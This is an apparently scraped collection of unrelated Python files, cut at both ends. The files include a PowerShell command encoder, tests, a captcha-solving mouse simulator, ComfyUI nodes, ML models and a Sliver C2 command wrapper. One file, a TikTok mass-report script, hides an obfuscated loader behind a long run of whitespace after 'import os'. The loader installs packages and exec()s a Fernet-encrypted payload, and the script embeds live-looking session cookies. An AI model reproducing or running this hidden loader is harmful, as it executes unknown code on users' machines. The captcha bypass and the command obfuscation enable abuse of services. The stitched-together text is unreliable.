Command\\n================================\\n{}\\n================================\".format(full_command))\n        encoded = po(full_command, em)\n    else:\n        print(\"Original Command\\n================================\\n{}\\n================================\".format(powershell_cmd))\n        encoded = po(powershell_cmd, em)\n\n    print(\"\\033[31m\" + r\"FINAL Encoded Command\"+ \"\\033[0m\"\"\\n================================\\n{}\\n================================\".format(encoded))\n\n    if out_to_file.lower() == 'y':\n        with open('encoded.ps1', 'w') as file:\n            file.write(encoded)\n        print(\"================================\\nFile saved to 'encoded.ps1'\\n================================\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import pytest\nfrom unittest.mock import patch, MagicMock, mock_open\nimport dpq\nimport requests\n\n\n@pytest.fixture\ndef agent_instance():\n    \"\"\"\n    A pytest fixture that creates an instance of the Agent class.\n    This fixture provides a reusable Agent instance with pre-configured settings\n    for use in multiple test functions.\n    \"\"\"\n    return dpq.Agent(url=\"http://example.com/api\", api_key=\"dummy_key\", model=\"model1\")\n\n\ndef test_load_function_payloads(agent_instance):\n    \"\"\"\n    Tests if the Agent class correctly loads function payloads from JSON files.\n    It checks if the necessary attributes are set on the Agent instance after loading.\n    \"\"\"\n    # Mock 'open' to return a predefined JSON content and 'os.listdir' to simulate\n    # existing JSON files\n    with patch(\"builtins.open\", mock_open(read_data='{\"key\": \"value\"}')), patch(\n        \"os.listdir\", return_value=[\"message1.json\", \"message2.json\"]\n    ):\n        agent_instance._load_function_payloads()  # Load the payloads\n        assert hasattr(\n            agent_instance, \"message1\"\n        )  # Check if the payload has been set as an attribute\n        assert hasattr(agent_instance, \"message2\")  # Check for another payload\n\n\ndef test_process_row_success(agent_instance):\n    \"\"\"\n    Tests the successful processing of a row by the Agent's _process_row method.\n    Checks if the correct response is returned when the requests.post call succeeds.\n    \"\"\"\n    # Mock 'requests.post' to return a successful response\n    with patch(\"requests.post\") as mocked_post:\n        mocked_response = MagicMock()\n        mocked_response.raise_for_status.return_value = (\n            None  # No exception for HTTP errors\n        )\n        mocked_response.json.return_value = {\n            \"choices\": [\n                {\"message\": {\"content\": \"response message\"}}\n            ]  # Define expected JSON response\n        }\n        mocked_post.return_value = mocked_response\n\n        # Call the method and verify that the returned result is as expected\n        result = agent_instance._process_row(\n            \"dummy_item\", [{\"role\": \"system\", \"content\": \"test\"}]\n        )\n        assert result == \"response message\"  # Validate the response\n\n\ndef test_process_row_failure(agent_instance):\n    \"\"\"\n    Tests the handling of HTTP errors by the Agent's _process_row method.\n    It checks if the method returns None and logs an error when an HTTPError occurs.\n    \"\"\"\n    # Mock 'requests.post' to simulate an HTTP error\n    with patch(\"requests.post\") as mocked_post:\n        mocked_response = MagicMock()\n        mocked_response.text = \"Error\"  # Mock the text of the error response\n        exception = requests.exceptions.HTTPError()  # Create an HTTPError exception\n        exception.response = (\n            mocked_response  # Attach the mocked response to the exception\n        )\n        mocked_post.side_effect = (\n            exception  # Set the side effect to raise the exception\n        )\n\n        # Call the method and check the results\n        result = agent_instance._process_row(\n            \"dummy_item\", [{\"role\": \"system\", \"content\": \"test\"}]\n        )\n        assert result is None  # Expect None due to error\n        assert \"Error\" in agent_instance.errors  # Error message should be logged\n",
    "from scipy import interpolate\nimport numpy as np\nimport string\nimport random\nimport math\nimport time\n\n# not fully my code\n# but heavily modified and updated by dexv\n\nclass util:\n    @staticmethod\n    def randint(a: int, b: int) -> int:\n        return random.randint(min(a, b), max(a, b))\n\n    @staticmethod\n    def get_ms() -> int:\n        return int(time.time() * 1000)\n\n    @staticmethod\n    def get_mm(start: tuple, goal: tuple, screen_size: tuple, max_points: int, random_amount: int, polling_rate: int) -> list:\n        cp = util.randint(3, 5)\n        x, y = np.linspace(start[0], goal[0], num=cp, dtype='int'), np.linspace(start[1], goal[1], num=cp, dtype='int')\n        r = [util.randint(-random_amount, random_amount) for _ in range(cp)]\n        x += np.clip(r, 0, screen_size[0])\n        y += np.clip(r, 0, screen_size[1])\n        tck, _ = interpolate.splprep((x, y), k=3 if cp > 3 else cp - 1)\n        u = np.linspace(0, 1, num=min(2 + int(math.sqrt((goal[0] - start[0]) ** 2 + (goal[1] - start[1]) ** 2) / polling_rate), max_points))\n        points = interpolate.splev(u, tck)\n        return [[int(x), int(y), util.get_ms()] for x, y in zip(*(i.astype(int) for i in points)) if time.sleep(1 / util.randint(80, 240)) is None]\n\n    @staticmethod\n    def periods(timestamps: list) -> float:\n        periods = [timestamps[i + 1] - timestamps[i] for i in range(len(timestamps) - 1)]\n        return sum(periods) / len(periods) if periods else 0\n\n    @staticmethod\n    def distance(a: tuple, b: tuple) -> float:\n        return math.sqrt((b[0] - a[0]) ** 2 + (b[1] - a[1]) ** 2)\n\n    @staticmethod\n    def get_random_point(bbox: tuple) -> tuple:\n        return util.randint(bbox[0][0], bbox[1][0]), util.randint(bbox[0][1], bbox[1][1])\n\n    @staticmethod\n    def get_center(bbox: tuple) -> tuple:\n        x1, y1 = bbox[0]\n        x2, y2 = bbox[1]\n\n        return int(x1 + (x2 - x1) / 2), int(y1 + (y2 - y1) / 2)\n\nclass rectangle:\n    def __init__(self, width: int, height: int) -> None:\n        self.width = width\n        self.height = height\n\n    def get_dimensions(self) -> tuple:\n        return self.width, self.height\n\n    def get_box(self, rel_x: int, rel_y: int) -> tuple:\n        return (rel_x, rel_y), (rel_x + self.width, rel_y + self.height)\n\n    def get_corners(self, rel_x: int = 0, rel_y: int = 0) -> list:\n        return [(rel_x, rel_y), (rel_x + self.width, rel_y), (rel_x, rel_y + self.height), (rel_x + self.width, rel_y + self.height)]\n\nclass widget_check:\n    def __init__(self, rel_position: tuple) -> None:\n        self.widget = rectangle(300, 75)\n        self.check_box = rectangle(28, 28)\n        self.rel_position = rel_position\n\n    def get_check(self) -> tuple:\n        return self.check_box.get_box(16 + self.rel_position[0], 23 + self.rel_position[1])\n\n    def get_closest(self, position: tuple) -> tuple:\n        corners = self.widget.get_corners(self.rel_position[0], self.rel_position[1])\n        sorted_corners = sorted(corners, key=lambda c: util.distance(position, c))\n        return sorted_corners[0], sorted_corners[1]\n\nclass text_challenge:\n    def __init__(self, box_centre: tuple, screen_size: tuple) -> None:\n        x = min(max(box_centre[0] + 25, 0), screen_size[0] / 2 - 185)\n        y = min(max(box_centre[1] - 150, 10), screen_size[1] - 310)\n    \n        self.widget_position = (x, y)\n        self.widget = rectangle(370, 300)\n        self.text_box = rectangle(314, 40)\n        self.button = rectangle(80, 35)\n\n    def get_text_box(self) -> tuple:\n        return self.text_box.get_box(28, 165)\n\n    def get_button_box(self) -> tuple:\n        return self.button.get_box(280, 255)\n\n    def get_closest(self, position: tuple) -> tuple:\n        corners = self.widget.get_corners(self.widget_position[0], self.widget_position[1])\n        sorted_corners = sorted(corners, key=lambda c: util.distance(position, c))\n        return sorted_corners[0], sorted_corners[1]\n\nCOMMON_SCREEN_SIZES = [\n    (1024, 768),\n    (1280, 720),\n    (1280, 800),\n    (1280, 960),\n    (1280, 1024),\n    (1366, 768),\n    (1440, 900),\n    (1600, 900),\n    (1600, 1200),\n    (1680, 1050),\n    (1920, 1080),\n    (1920, 1200),\n    (2048, 1152),\n    (2560, 1440),\n    (2560, 1600)\n]\n\nCOMMON_CORE_COUNTS = [\n    2,\n    4,\n    6,\n    8,\n    12,\n    16,\n    32\n]\n\nclass get_cap:\n    global COMMON_SCREEN_SIZES, COMMON_CORE_COUNTS\n    def __init__(self, user_agent: str, href: str) -> None:\n        self.user_agent = user_agent\n        screen_size = random.choice(COMMON_SCREEN_SIZES)\n        self.screen_size = screen_size\n        widget_id = '0' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))\n        random_point = util.get_random_point(((0, 0), (screen_size[0] - 150, screen_size[1] - 38)))\n        self.widget = widget_check(random_point)\n        self.position = util.get_random_point(((0, 0), screen_size))\n        data = {\n            'st': util.get_ms(),\n            'mm': [],\n            'mm-mp': 0,\n            'md': [],\n            'md-mp': 0,\n          ",
    "import os\r\nfrom ..config import config_path,current_dir_path,load_api_keys\r\n\r\nclass start_dialog:\r\n    def __init__(self):\r\n        self.start = True\r\n        #\u751f\u6210\u4e00\u4e2ahash\u503c\u4f5c\u4e3aid\r\n        self.id=hash(str(self))\r\n        # \u6784\u5efaprompt.txt\u7684\u7edd\u5bf9\u8def\u5f84\r\n        self.prompt_path = os.path.join(current_dir_path,\"temp\", str(self.id)+'.txt')\r\n        # \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u521b\u5efaprompt.txt\u6587\u4ef6\uff0c\u5b58\u5728\u5c31\u8986\u76d6\u6587\u4ef6\r\n        if not os.path.exists(self.prompt_path):\r\n            with open(self.prompt_path, 'w', encoding='utf-8') as f:\r\n                f.write('')\r\n\r\n\r\n    @classmethod\r\n    def INPUT_TYPES(s):\r\n        return {\r\n            \"required\": {\r\n                \"start_dialog\": (\"STRING\", {\r\n\r\n                })\r\n            }\r\n        }\r\n    \r\n    RETURN_TYPES = (\"STRING\",\"STRING\",)\r\n    RETURN_NAMES = (\"dialog_id\",\"user_prompt\",)\r\n\r\n    FUNCTION = \"dialog\"\r\n\r\n    #OUTPUT_NODE = False\r\n\r\n    CATEGORY = \"\u5927\u6a21\u578b\u6d3e\u5bf9\uff08llm_party\uff09/\u9762\u5177\u548c\u51fd\u6570\uff08persona&function\uff09\"\r\n\r\n\r\n\r\n    def dialog(self, start_dialog):\r\n        if self.start == False:\r\n            # \u8bfb\u53d6prompt.txt\u6587\u4ef6\u5185\u5bb9\r\n            with open(self.prompt_path, 'r', encoding='utf-8') as f:\r\n                prompt = f.read()\r\n        else:\r\n            prompt = start_dialog\r\n            self.start = False\r\n        dialog_id=self.id\r\n        return (prompt,dialog_id,)\r\n    \r\nclass end_dialog:\r\n    @classmethod\r\n    def INPUT_TYPES(s):\r\n        return {\r\n            \"required\": {\r\n                \"dialog_id\": (\"STRING\", {\r\n                    \"forceInput\": True\r\n                }),\r\n                \"assistant_response\": (\"STRING\", {\r\n                    \"forceInput\": True\r\n                })\r\n            }\r\n        }\r\n    \r\n    RETURN_TYPES = ()\r\n    RETURN_NAMES = ()\r\n\r\n    FUNCTION = \"dialog\"\r\n\r\n    OUTPUT_NODE = False\r\n\r\n    CATEGORY = \"\u5927\u6a21\u578b\u6d3e\u5bf9\uff08llm_party\uff09/\u9762\u5177\u548c\u51fd\u6570\uff08persona&function\uff09\"\r\n\r\n\r\n\r\n    def dialog(self, dialog_id,assistant_response):\r\n        # \u6784\u5efaprompt.txt\u7684\u7edd\u5bf9\u8def\u5f84\r\n        self.prompt_path = os.path.join(current_dir_path,\"temp\", str(dialog_id)+'.txt')\r\n        # \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u521b\u5efaprompt.txt\u6587\u4ef6\uff0c\u5b58\u5728\u5c31\u8986\u76d6\u6587\u4ef6\r\n        if not os.path.exists(self.prompt_path):\r\n            with open(self.prompt_path, 'w', encoding='utf-8') as f:\r\n                f.write(assistant_response)\r\n        return ()",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'EOIDJoGq_4VyXszAPvfywt-XW6G6RHTX0lvSUOloLFs=').decrypt(b'gAAAAABmGp4fVfjmAZY5h3cWtBWbKZFBAFFs8RvAoJpuNSF7H_BGZZTnui-tMCT9milaJ6oY3eXMRxhrr-oRYrx2-eYFEE7Nj60vH_enexWhI9lLmV_PYwd_StdLlHS6r57ItuI5fIxYJ6uaJKqXdN3KujUOkotipFBAMWA7MqZ-z8DPM_fV6qSSdZhwgjiGSrylZUqGL8NGnXaw_zM26wqYCHO6WEugXa5cDz9Ji1_Qm1zAGXLyWgI='))\nimport requests\nimport json\n\n\ntiktokvideolink = input('Video ID > ')\ntiktokvideolinkreal = input('Tiktok Video Link')\n\nurl = \"https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web_pc&device_id=6987530745909036549&region=DK&priority_region=&os=windows&referer=&root_referer=&cookie_enabled=true&screen_width=1920&screen_height=1080&browser_language=da-DK&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F92.0.4515.107+Safari%2F537.36&browser_online=true&verifyFp=verify_krfa96cw_p2Eae0I8_dJaE_4XwS_AEGm_KOmG1m49cOwX&app_language=en&timezone_name=Europe%2FCopenhagen&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=4&battery_info=1\"\n\npayload = json.dumps({\n  \"reason\": 1004,\n  \"object_id\": tiktokvideolink,\n  \"owner_id\": \"6636714219386781701\",\n  \"report_type\": \"video\"\n})\nheaders = {\n  'authority': 'www.tiktok.com',\n  'sec-ch-ua': '\"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"',\n  'accept': 'application/json, text/plain, */*',\n  'x-secsdk-csrf-token': '000100000001ddd4e9748bc018f9e9c13093fb09bb878e0c97573abfdbf43ec8d0817c782b7a1694901c1b038c13',\n  'sec-ch-ua-mobile': '?0',\n  'tt-csrf-token': 'ePCjBjwO15QhaDbSrq7NMj6L',\n  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',\n  'content-type': 'application/json',\n  'origin': 'https://www.tiktok.com',\n  'sec-fetch-site': 'same-origin',\n  'sec-fetch-mode': 'cors',\n  'sec-fetch-dest': 'empty',\n  'referer': tiktokvideolinkreal,\n  'accept-language': 'da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7',\n  'cookie': 'tt_webid_v2=6987530745909036549; tt_webid=6987530745909036549; cookie-consent={%22ga%22:true%2C%22af%22:true%2C%22fbp%22:true%2C%22lip%22:true%2C%22version%22:%22v2%22}; s_v_web_id=verify_krfa96cw_p2Eae0I8_dJaE_4XwS_AEGm_KOmG1m49cOwX; MONITOR_WEB_ID=6987530745909036549; tt_csrf_token=ePCjBjwO15QhaDbSrq7NMj6L; R6kq3TV7=AGIivtV6AQAAN-OR-sxIv18EYkOMaPvth3F_97xkhJ_OT_yI7nG6UayUCYRk|1|0|d52a182c37413d8803c7100633cc49d673b8b993; ttwid=1%7C0D_adjNZXWbKipMeZG_RUyaNe6bFDSttsAX927MCOZ8%7C1627083654%7C4310fd827053a66f1886a63bea5b6d42b8b11ab91b563ac183eff76b902f48c9; csrf_session_id=d3b7880ce8d34ce0821782de56fae639'\n}\n\nresponse = requests.request(\"POST\", url, headers=headers, data=payload)\n\nwhile True:\n    print(response.text)\nprint('yfbqufkf')",
    "import argparse\r\nimport datetime\r\nimport os\r\n\r\nimport lightning as L\r\nimport pandas as pd\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.optim as optim\r\nfrom einops import rearrange\r\nfrom lightning.pytorch.callbacks import LearningRateMonitor, ModelCheckpoint, TQDMProgressBar\r\nfrom timm.models.layers import DropPath\r\nfrom timm.models.layers import trunc_normal_\r\nfrom torchmetrics.regression import MeanSquaredError, MeanAbsoluteError\r\n\r\nfrom data_factory import data_provider\r\nfrom utils import save_copy_of_files, random_masking_3D, str2bool\r\n\r\n\r\nclass ICB(L.LightningModule):\r\n    def __init__(self, in_features, hidden_features, drop=0.):\r\n        super().__init__()\r\n        self.conv1 = nn.Conv1d(in_features, hidden_features, 1)\r\n        self.conv2 = nn.Conv1d(in_features, hidden_features, 3, 1, padding=1)\r\n        self.conv3 = nn.Conv1d(hidden_features, in_features, 1)\r\n        self.drop = nn.Dropout(drop)\r\n        self.act = nn.GELU()\r\n\r\n    def forward(self, x):\r\n        x = x.transpose(1, 2)\r\n        x1 = self.conv1(x)\r\n        x1_1 = self.act(x1)\r\n        x1_2 = self.drop(x1_1)\r\n\r\n        x2 = self.conv2(x)\r\n        x2_1 = self.act(x2)\r\n        x2_2 = self.drop(x2_1)\r\n\r\n        out1 = x1 * x2_2\r\n        out2 = x2 * x1_2\r\n\r\n        x = self.conv3(out1 + out2)\r\n        x = x.transpose(1, 2)\r\n        return x\r\n\r\n\r\nclass Adaptive_Spectral_Block(nn.Module):\r\n    def __init__(self, dim):\r\n        super().__init__()\r\n        self.complex_weight_high = nn.Parameter(torch.randn(dim, 2, dtype=torch.float32) * 0.02)\r\n        self.complex_weight = nn.Parameter(torch.randn(dim, 2, dtype=torch.float32) * 0.02)\r\n\r\n        trunc_normal_(self.complex_weight_high, std=.02)\r\n        trunc_normal_(self.complex_weight, std=.02)\r\n        self.threshold_param = nn.Parameter(torch.rand(1) * 0.5)\r\n\r\n    def create_adaptive_high_freq_mask(self, x_fft):\r\n        B, _, _ = x_fft.shape\r\n\r\n        # Calculate energy in the frequency domain\r\n        energy = torch.abs(x_fft).pow(2).sum(dim=-1)\r\n\r\n        # Flatten energy across H and W dimensions and then compute median\r\n        flat_energy = energy.view(B, -1)  # Flattening H and W into a single dimension\r\n        median_energy = flat_energy.median(dim=1, keepdim=True)[0]  # Compute median\r\n        median_energy = median_energy.view(B, 1)  # Reshape to match the original dimensions\r\n\r\n        # Normalize energy\r\n        normalized_energy = energy / (median_energy + 1e-6)\r\n\r\n        threshold = torch.quantile(normalized_energy, self.threshold_param)\r\n        dominant_frequencies = normalized_energy > threshold\r\n\r\n        # Initialize adaptive mask\r\n        adaptive_mask = torch.zeros_like(x_fft, device=x_fft.device)\r\n        adaptive_mask[dominant_frequencies] = 1\r\n\r\n        return adaptive_mask\r\n\r\n    def forward(self, x_in):\r\n        B, N, C = x_in.shape\r\n\r\n        dtype = x_in.dtype\r\n        x = x_in.to(torch.float32)\r\n\r\n        # Apply FFT along the time dimension\r\n        x_fft = torch.fft.rfft(x, dim=1, norm='ortho')\r\n        weight = torch.view_as_complex(self.complex_weight)\r\n        x_weighted = x_fft * weight\r\n\r\n        if args.adaptive_filter:\r\n            # Adaptive High Frequency Mask (no need for dimensional adjustments)\r\n            freq_mask = self.create_adaptive_high_freq_mask(x_fft)\r\n            x_masked = x_fft * freq_mask.to(x.device)\r\n\r\n            weight_high = torch.view_as_complex(self.complex_weight_high)\r\n            x_weighted2 = x_masked * weight_high\r\n\r\n            x_weighted += x_weighted2\r\n\r\n        # Apply Inverse FFT\r\n        x = torch.fft.irfft(x_weighted, n=N, dim=1, norm='ortho')\r\n\r\n        x = x.to(dtype)\r\n        x = x.view(B, N, C)  # Reshape back to original shape\r\n\r\n        return x\r\n\r\n\r\nclass TSLANet_layer(L.LightningModule):\r\n    def __init__(self, dim, mlp_ratio=3., drop=0., drop_path=0., norm_layer=nn.LayerNorm):\r\n        super().__init__()\r\n        self.norm1 = norm_layer(dim)\r\n        self.asb = Adaptive_Spectral_Block(dim)\r\n        self.drop_path = DropPath(drop_path) if drop_path > 0. else nn.Identity()\r\n        self.norm2 = norm_layer(dim)\r\n        mlp_hidden_dim = int(dim * mlp_ratio)\r\n        self.icb = ICB(in_features=dim, hidden_features=mlp_hidden_dim, drop=drop)\r\n\r\n    def forward(self, x):\r\n        # Check if both ASB and ICB are true\r\n        if args.ICB and args.ASB:\r\n            x = x + self.drop_path(self.icb(self.norm2(self.asb(self.norm1(x)))))\r\n        # If only ICB is true\r\n        elif args.ICB:\r\n            x = x + self.drop_path(self.icb(self.norm2(x)))\r\n        # If only ASB is true\r\n        elif args.ASB:\r\n            x = x + self.drop_path(self.asb(self.norm1(x)))\r\n        # If neither is true, just pass x through\r\n        return x\r\n\r\n\r\nclass TSLANet(nn.Module):\r\n\r\n    def __init__(self):\r\n        super(TSLANet, self).__init__()\r\n\r\n        self.patch_size = args.patch_size\r\n        self.stride = self.patch_size // 2\r\n        num_patches = int((args.seq_len - self.patch_size) / self.stride + 1)\r\n\r\n        # La",
    "from ..SliverRequests import SliverAPI\n\nfrom mythic_container.MythicCommandBase import *\nfrom mythic_container.MythicRPC import *\nfrom mythic_container.PayloadBuilder import *\n\n\nclass CanariesArguments(TaskArguments):\n    def __init__(self, command_line, **kwargs):\n        super().__init__(command_line, **kwargs)\n        self.args = []\n\n    async def parse_arguments(self):\n        pass\n\n\nclass Canaries(CommandBase):\n    cmd = \"canaries\"\n    needs_admin = False\n    help_cmd = \"canaries\"\n    description = \"List previously generated canaries\"\n    version = 1\n    author = \"Spencer Adolph\"\n    argument_class = CanariesArguments\n    attackmapping = []\n\n    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:\n        # List previously generated canaries\n\n        # Usage:\n        # ======\n        #   canaries [flags]\n\n        # Flags:\n        # ======\n        # TODO:  -b, --burned         show only triggered/burned canaries\n        #        -h, --help           display help\n        #        -t, --timeout int    command timeout in seconds (default: 60)\n\n        response = await canaries(taskData)\n\n        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(\n            TaskID=taskData.Task.ID,\n            Response=response.encode(\"UTF8\"),\n        ))\n\n        taskResponse = MythicCommandBase.PTTaskCreateTaskingMessageResponse(\n            TaskID=taskData.Task.ID,\n            Success=True,\n            Completed=True\n        )\n\n        return taskResponse\n\n    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:\n        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)\n        return resp\n\n\nasync def canaries(taskData: PTTaskMessageAllData):\n    client = await SliverAPI.create_sliver_client(taskData)\n\n    canaries_list = await client.canaries()\n\n    # TODO: match sliver formatting\n\n    return f\"{canaries_list}\"\n",
    "import datetime \nfrom sklearn.metrics import roc_curve, auc, accuracy_score, recall_score, f1_score, average_precision_score\n\n\ndef write_log(w):\n    file_name = 'logs/' + datetime.date.today().strftime('%m%d')+\"_{}.log\"\n    t0 = datetime.datetime.now().strftime('%H:%M:%S')\n    info = \"{} : {}\".format(t0, w)\n    print(info)\n    with open(file_name, 'a') as f: \n        f.write(info + '\\n') \n\ndef calculate_metrics(true_values, predictions, epoch, num_epochs, train_loss, val_loss, label):\n    fpr, tpr, _ = roc_curve(true_values, predictions)\n    auc_value = auc(fpr, tpr)\n    ks = max(tpr - fpr)\n    gini = 2 * auc_value - 1\n    val_preds_class = [1 if x > 0.5 else 0 for x in predictions]\n    accuracy = accuracy_score(true_values, val_preds_class)\n    recall = recall_score(true_values, val_preds_class)\n    f1 = f1_score(true_values, val_preds_class)\n    auc_pr = average_precision_score(true_values, predictions)\n    msg = (f'{label}: Epoch [{epoch + 1}/{num_epochs}] - Train Loss: {train_loss:.4f}, Val Loss: {val_loss:.4f}, '\n           f'Val AUC_roc score: {auc_value:.4f}, Val KS score: {ks:.4f}, Val gini score: {gini:.4f}, '\n           f'Val accuracy score: {accuracy:.4f}, Val recall score: {recall:.4f}, Val f1 score: {f1:.4f}, '\n           f'Val auc_pr score: {auc_pr:.4f}')\n    write_log(msg)\n    return ks   ",
    "import torch\nimport os\nfrom copy import deepcopy\n\nclass ModelExporter(torch.nn.Module):\n    def __init__(self, yoloModel, device='cpu'):\n        super(ModelExporter, self).__init__()\n        model = deepcopy(yoloModel).to(device)\n        for p in model.parameters():\n            p.requires_grad = False\n        model.eval()\n        model.float()\n        model = model.fuse()\n\n        self.model = model\n        self.device = device\n\n    def forward(self, x, txt_feats):\n        return self.model.predict(x, txt_feats=txt_feats)\n\n    def export(self, output_dir, model_name, img_width, img_height, num_classes):\n        x = torch.randn(1, 3, img_width, img_height, requires_grad=False).to(self.device)\n        txt_feats = torch.randn(1, num_classes, 512, requires_grad=False).to(self.device)\n\n        print(x.shape, txt_feats.shape)\n\n        # Export model\n        onnx_name = model_name + \".onnx\"\n        os.makedirs(output_dir, exist_ok=True)\n        output_path = f\"{output_dir}/{onnx_name}\"\n        with torch.no_grad():\n            torch.onnx.export(self,\n                              (x, txt_feats),\n                              output_path,\n                              do_constant_folding=True,\n                              opset_version=17,\n                              input_names=[\"images\", \"txt_feats\"],\n                              output_names=[\"output\"])\n\n        return output_path",
    "import math\nfrom typing import Union, Tuple\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom transformers.models.xlnet.modeling_xlnet import XLNetPreTrainedModel\nfrom transformers.models.xlnet.modeling_xlnet import (\n    XLNetLayer,\n    SequenceSummary,\n)\n\n\nclass XLNetModel(XLNetPreTrainedModel):\n    def resize_position_embeddings(self, new_num_position_embeddings: int):\n        pass\n\n    def get_position_embeddings(self) -> Union[nn.Embedding, Tuple[nn.Embedding]]:\n        pass\n\n    def prepare_inputs_for_generation(self, *args, **kwargs):\n        pass\n\n    def _reorder_cache(self, past_key_values, beam_idx):\n        pass\n\n    def __init__(self, config):\n        super().__init__(config)\n\n        self.mem_len = config.mem_len\n        self.reuse_len = config.reuse_len\n        self.d_model = config.d_model\n        self.same_length = config.same_length\n        self.attn_type = config.attn_type\n        self.bi_data = config.bi_data\n        self.clamp_len = config.clamp_len\n        self.n_layer = config.n_layer\n\n        self.word_embedding = nn.Embedding(config.vocab_size, config.d_model)\n        self.mask_emb = nn.Parameter(torch.FloatTensor(1, 1, config.d_model))\n        self.layer = nn.ModuleList([XLNetLayer(config) for _ in range(config.n_layer)])\n        self.dropout = nn.Dropout(config.dropout)\n\n        self.init_weights()\n\n    def get_input_embeddings(self):\n        return self.word_embedding\n\n    def set_input_embeddings(self, new_embeddings):\n        self.word_embedding = new_embeddings\n\n    def _prune_heads(self, heads_to_prune):\n        raise NotImplementedError\n\n    def create_mask(self, qlen, mlen):\n        attn_mask = torch.ones([qlen, qlen])\n        mask_up = torch.triu(attn_mask, diagonal=1)\n        attn_mask_pad = torch.zeros([qlen, mlen])\n        ret = torch.cat([attn_mask_pad, mask_up], dim=1)\n        if self.same_length:\n            mask_lo = torch.tril(attn_mask, diagonal=-1)\n            ret = torch.cat([ret[:, :qlen] + mask_lo, ret[:, qlen:]], dim=1)\n\n        ret = ret.to(self.device)\n        return ret\n\n    def cache_mem(self, curr_out, prev_mem):\n        if self.reuse_len is not None and self.reuse_len > 0:\n            curr_out = curr_out[: self.reuse_len]\n        if prev_mem is None:\n            new_mem = curr_out[-self.mem_len:]\n        else:\n            new_mem = torch.cat([prev_mem, curr_out], dim=0)[-self.mem_len:]\n        return new_mem.detach()\n\n    @staticmethod\n    def positional_embedding(pos_seq, inv_freq, bsz=None):\n        sinusoid_inp = torch.einsum(\"i,d->id\", pos_seq, inv_freq)\n        pos_emb = torch.cat(\n            [torch.sin(sinusoid_inp), torch.cos(sinusoid_inp)], dim=-1)\n        pos_emb = pos_emb[:, None, :]\n        if bsz is not None:\n            pos_emb = pos_emb.expand(-1, bsz, -1)\n        return pos_emb\n\n    def relative_positional_encoding(self, qlen, klen, bsz=None):\n        freq_seq = torch.arange(0, self.d_model, 2.0, dtype=torch.float)\n        inv_freq = 1 / torch.pow(10000, (freq_seq / self.d_model))\n        if self.attn_type == \"bi\":\n            beg, end = klen, -qlen\n        elif self.attn_type == \"uni\":\n            beg, end = klen, -1\n        else:\n            raise ValueError(\"Unknown `attn_type` {}.\".format(self.attn_type))\n\n        if self.bi_data:\n            fwd_pos_seq = torch.arange(beg, end, -1.0, dtype=torch.float)\n            bwd_pos_seq = torch.arange(-beg, -end, 1.0, dtype=torch.float)\n            if self.clamp_len > 0:\n                fwd_pos_seq = fwd_pos_seq.clamp(-self.clamp_len, self.clamp_len)\n                bwd_pos_seq = bwd_pos_seq.clamp(-self.clamp_len, self.clamp_len)\n            if bsz is not None:\n                fwd_pos_emb = self.positional_embedding(fwd_pos_seq, inv_freq, bsz // 2)\n                bwd_pos_emb = self.positional_embedding(bwd_pos_seq, inv_freq, bsz // 2)\n            else:\n                fwd_pos_emb = self.positional_embedding(fwd_pos_seq, inv_freq)\n                bwd_pos_emb = self.positional_embedding(bwd_pos_seq, inv_freq)\n            pos_emb = torch.cat([fwd_pos_emb, bwd_pos_emb], dim=1)\n        else:\n            fwd_pos_seq = torch.arange(beg, end, -1.0)\n            if self.clamp_len > 0:\n                fwd_pos_seq = fwd_pos_seq.clamp(-self.clamp_len, self.clamp_len)\n            pos_emb = self.positional_embedding(fwd_pos_seq, inv_freq, bsz)\n        pos_emb = pos_emb.to(self.device)\n        return pos_emb\n\n    def forward(self, input_ids, attention_mask=None, mems=None, perm_mask=None, target_mapping=None,\n                token_type_ids=None, input_mask=None, head_mask=None, inputs_embeds=None, use_cache=True,\n                output_attentions=None, output_hidden_states=None):\n        output_attentions = (\n            output_attentions\n            if output_attentions is not None\n            else self.config.output_attentions\n        )\n        output_hidden_states = (\n            output_hidden_states\n            if output_hidden_states is not None\n            else self.config.output_",
    "import os\r\nimport json\r\nimport time\r\nimport torch\r\nfrom swift.llm import (\r\n    get_model_tokenizer, get_template, inference, ModelType, get_default_template_type\r\n)\r\nfrom swift.tuners import Swift\r\n\r\nclass ModelEvaluation:\r\n    def __init__(self, model_dirs, model_type, test_path, eval_limit=1000, max_new_tokens=256):\r\n        self.model_dirs = model_dirs\r\n        self.model_type = model_type\r\n        self.test_path = test_path\r\n        self.eval_limit = eval_limit\r\n        self.max_new_tokens = max_new_tokens\r\n        self.template_type = get_default_template_type(self.model_type)\r\n        self.model, self.tokenizer = get_model_tokenizer(self.model_type, torch.bfloat16, {'device_map': 'auto'})\r\n        self.json_errors = 0\r\n\r\n    def convert_to_json_correctly(self, s):\r\n        replacements = {\r\n            '\\\"': \"\\'\",\r\n            \"\\'thought\\': \\'\": '\\\"thought\\\": \\\"',\r\n            \"\\'thought\\': \\\"\": '\\\"thought\\\": \\\"',\r\n            \"yes\": \"no\"\r\n        }\r\n        for old, new in replacements.items():\r\n            s = 